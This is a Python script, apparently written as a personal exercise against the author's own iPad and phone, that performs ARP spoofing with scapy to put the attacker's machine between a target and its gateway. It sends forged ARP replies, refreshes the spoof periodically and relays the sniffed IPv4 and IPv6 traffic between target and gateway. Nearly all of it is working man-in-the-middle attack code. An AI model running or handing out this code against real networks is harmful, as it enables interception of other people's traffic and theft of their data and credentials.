"""
    Implemented by nnnyyc.
"""
from warnings import filterwarnings
filterwarnings("ignore")
import signal
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR


req_domain = '36.152.44.95'

def target_cheatpacket(TargetIp, GatewayIp):
    """Build ARP packet to cheat the target
    Args:
        TargetIp: The ipv4 address of attacked target.(In this case, my iPad)
        GatewayIp: The ipv4 address of gateway.(In this case, my phone)
    Return:
        a packet on layer 2 to cheat target
    """
    print("[-] Obtaining mac from {}".format(TargetIp))
    # # Get mac address of target(from ipv4 address)
    TargetMacAddr = None
    while not TargetMacAddr:
        TargetMacAddr = getmacbyip(TargetIp)
    print("Mac address of target:{}".format(TargetMacAddr))
    # # Get mac address of hacker(from interface)
    MyMacAddr = get_if_hwaddr("Intel(R) Wi-Fi 6 AX200 160MHz")
    print("Mac address of hacker:{}".format(MyMacAddr))
    # # Make Ether packet
    pkt = Ether(src=MyMacAddr, dst=TargetMacAddr) / ARP(hwsrc=MyMacAddr, psrc=GatewayIp,
                                                        hwdst=TargetMacAddr, pdst=TargetIp)
    pkt.show()
    return pkt


def forward_callback(packet):
    """Transmit packets from gateway to target
    Args:
        packet: The packet captured by sniffer
    Return:
        none
    """
    global step
    step += 1
    print('step={}'.format(step))
    # send arp spoof packet periodic
    if step % 10 == 0:
        sendp(packet2target, iface=Myiface)
        print('arp spoof!')

    # transmit packets to target ip
    resp = Ether(src=MyMac)
    if packet.haslayer(IP):
        resp /= packet[IP]
        if resp[IP].dst == TargetIp:
            print("gatewway转发中.")
            resp[Ether].dst = TargetMac
        elif resp[IP].src == TargetIp:
            resp[Ether].dst = GatewayMac
            print("target转发中.")
    elif packet.haslayer(IPv6):
        resp /= packet[IPv6]
        if resp[IPv6].dst == TargetIp:
            print("gatewway转发中.")
            resp[Ether].dst = TargetMac
        elif resp[IPv6].src == TargetIp:
            resp[Ether].dst = GatewayMac
            print("target转发中.")

    sendp(resp, verbose=False, iface=Myiface)


def stop(signal, frame):
    sys.exit(0)


if __name__ == '__main__':
    step = int(0)
    MyIp = '172.20.10.2'
    TargetIp = '172.20.10.11'
    GatewayIp = '172.20.10.1'
    MyIpv6 = '240c:c781:7000:e4b8:ac2c:55b2:b192:f03a'
    TargetIpv6 = '2409:8928:8b2:4c5:be:e83e:f82b:170a'
    TargetMac = None
    while not TargetMac:
        TargetMac = getmacbyip(TargetIp)
    print('TargetMac:{}'.format(TargetMac))
    GatewayMac = None
    while not GatewayMac:
        GatewayMac = getmacbyip(GatewayIp)
    print('GatewayMac:{}'.format(GatewayMac))
    Myiface = "Intel(R) Wi-Fi 6 AX200 160MHz"
    MyMac = get_if_hwaddr(Myiface)

    # # When the connection get interupted, exit the script
    signal.signal(signal.SIGINT, stop)

    # # Build Ether packet
    packet2target = target_cheatpacket(TargetIp, GatewayIp)

    # ARP spoof
    sendp(packet2target, iface=Myiface)
    # open the sniffer
    sniff(count=0, prn=forward_callback, filter='ip host {} or ipv6 host {}'.format(TargetIp, TargetIpv6))